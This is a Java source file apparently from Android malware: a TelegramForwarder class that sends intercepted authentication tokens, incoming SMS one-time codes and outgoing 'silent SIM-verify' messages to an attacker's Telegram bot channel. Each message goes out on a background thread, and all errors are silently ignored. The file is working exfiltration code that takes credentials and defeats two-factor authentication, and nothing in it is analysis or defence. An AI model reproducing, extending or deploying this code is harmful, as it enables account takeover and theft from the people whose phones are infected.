package com.tok.interceptor;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TelegramForwarder {

    private final String botToken;
    private final String channelId;
    private static final String API_BASE = "https://api.telegram.org/bot";

    public TelegramForwarder(String botToken, String channelId) {
        this.botToken  = botToken;
        this.channelId = channelId;
    }

    public void send(String headerName, String token, String host) {
        new Thread(() -> {
            try {
                String message = "🔑 *Token Intercepted*\n\n"
                    + "*Host:* `" + escape(host) + "`\n"
                    + "*Header:* `" + escape(headerName) + "`\n"
                    + "*Token:* `" + escape(token.length() > 300 ? token.substring(0, 300) + "..." : token) + "`\n"
                    + "*Time:* " + new java.util.Date();

                String endpoint = API_BASE + botToken + "/sendMessage";
                String body = "{\"chat_id\":\"" + channelId + "\","
                    + "\"text\":\"" + jsonEscape(message) + "\","
                    + "\"parse_mode\":\"Markdown\"}";

                URL url = new URL(endpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }

    /** Forward an intercepted outgoing (silent SIM-verify) SMS to Telegram. */
    public void sendOutgoingSms(String toNumber, String body) {
        new Thread(() -> {
            try {
                String message = "📤 *Outgoing SMS Intercepted*\n\n"
                    + "*To:* `" + escape(toNumber) + "`\n"
                    + "*Body:* `" + escape(body.length() > 500 ? body.substring(0, 500) + "..." : body) + "`\n"
                    + "*Time:* " + new java.util.Date();

                String endpoint = API_BASE + botToken + "/sendMessage";
                String payload = "{\"chat_id\":\"" + channelId + "\","
                    + "\"text\":\"" + jsonEscape(message) + "\","
                    + "\"parse_mode\":\"Markdown\"}";

                URL url = new URL(endpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.getBytes(StandardCharsets.UTF_8));
                }

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }

    /** Forward an intercepted SMS OTP to Telegram. */
    public void sendSms(String sender, String body) {
        new Thread(() -> {
            try {
                String message = "📱 *SMS Intercepted*\n\n"
                    + "*From:* `" + escape(sender) + "`\n"
                    + "*Message:* `" + escape(body.length() > 500 ? body.substring(0, 500) + "..." : body) + "`\n"
                    + "*Time:* " + new java.util.Date();

                String endpoint = API_BASE + botToken + "/sendMessage";
                String payload = "{\"chat_id\":\"" + channelId + "\","
                    + "\"text\":\"" + jsonEscape(message) + "\","
                    + "\"parse_mode\":\"Markdown\"}";

                URL url = new URL(endpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.getBytes(StandardCharsets.UTF_8));
                }

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }

    private String escape(String s) {
        return s.replace("`", "\\`").replace("*", "\\*").replace("_", "\\_");
    }

    private String jsonEscape(String s) {
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
